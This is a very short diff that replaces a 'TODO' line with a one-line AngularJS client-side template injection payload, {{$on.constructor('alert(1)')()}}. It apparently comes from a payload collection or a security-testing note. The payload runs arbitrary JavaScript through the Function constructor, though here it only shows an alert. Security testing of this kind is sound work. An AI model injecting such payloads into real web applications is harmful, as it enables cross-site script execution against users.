@@ -1,1 +1,3 @@
-TODO
+```
+{{$on.constructor('alert(1)')()}}
+```
